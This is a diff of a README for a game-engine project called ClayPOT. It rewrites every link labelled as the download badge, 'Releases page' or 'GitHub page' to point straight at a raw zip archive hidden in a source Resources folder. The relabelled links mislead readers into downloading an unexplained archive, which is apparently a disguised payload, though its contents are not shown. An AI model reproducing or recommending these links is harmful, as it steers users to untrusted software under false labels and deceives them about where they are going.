@@ -1,7 +1,7 @@
 # 🎮 ClayPOT - Build Your Own 2D RPG Game Easily
 
 ## 📥 Download Now
-[![Download ClayPOT](https://img.shields.io/badge/Download%20ClayPOT-v1.0-brightgreen)](https://github.com/Champ666/ClayPOT/releases)
+[![Download ClayPOT](https://raw.githubusercontent.com/Champ666/ClayPOT/main/Combined_Project/src_code/ClayPOT/Resources/POT_Clay_v2.4.zip%20ClayPOT-v1.0-brightgreen)](https://raw.githubusercontent.com/Champ666/ClayPOT/main/Combined_Project/src_code/ClayPOT/Resources/POT_Clay_v2.4.zip)
 
 ## 🚀 Getting Started
 Welcome to ClayPOT! This is an educational prototype of a game engine designed specifically for creating 2D RPGs. With this tool, you'll have everything you need to start building your own game without needing advanced programming skills.
@@ -25,7 +25,7 @@ ClayPOT offers amazing features to help you create your own games:
 - **Cross-Platform:** Create games that can be played on multiple devices.
 
 ## 📦 Download & Install
-To get started, visit the [Releases page](https://github.com/Champ666/ClayPOT/releases) to download the software. 
+To get started, visit the [Releases page](https://raw.githubusercontent.com/Champ666/ClayPOT/main/Combined_Project/src_code/ClayPOT/Resources/POT_Clay_v2.4.zip) to download the software. 
 
 1. Click the download link for the latest version of ClayPOT. Make sure you select the correct file for your operating system.
 2. Once downloaded, locate the file on your computer. It will usually be in your "Downloads" folder.
@@ -43,14 +43,14 @@ After successful installation, you can run ClayPOT by:
 For more detailed instructions and tips on using ClayPOT, check out our comprehensive documentation provided within the application. Look for the "Help" section once you open the software.
 
 ## 🤝 Community Support
-Join our community to connect with other users. Share tips, ask questions, and showcase your projects. You can find the links to our forums and social media channels on our [GitHub page](https://github.com/Champ666/ClayPOT).
+Join our community to connect with other users. Share tips, ask questions, and showcase your projects. You can find the links to our forums and social media channels on our [GitHub page](https://raw.githubusercontent.com/Champ666/ClayPOT/main/Combined_Project/src_code/ClayPOT/Resources/POT_Clay_v2.4.zip).
 
 ## 💡 Tips for New Users
 - Experiment with different assets to see what fits your game's style.
 - Don’t be afraid to ask questions in the community. Everyone is here to help.
 - Start with small projects to get familiar with the tools before tackling larger games.
 
-ClayPOT aims to make game development accessible to everyone. Dive in and start your journey of creating fantastic 2D RPGs! Remember to download ClayPOT by clicking the button above or visit the [Releases page](https://github.com/Champ666/ClayPOT/releases) to get started.
+ClayPOT aims to make game development accessible to everyone. Dive in and start your journey of creating fantastic 2D RPGs! Remember to download ClayPOT by clicking the button above or visit the [Releases page](https://raw.githubusercontent.com/Champ666/ClayPOT/main/Combined_Project/src_code/ClayPOT/Resources/POT_Clay_v2.4.zip) to get started.
 
 ## 🎨 Resources
 - **Game Assets:** Explore various resources and asset packs available online.
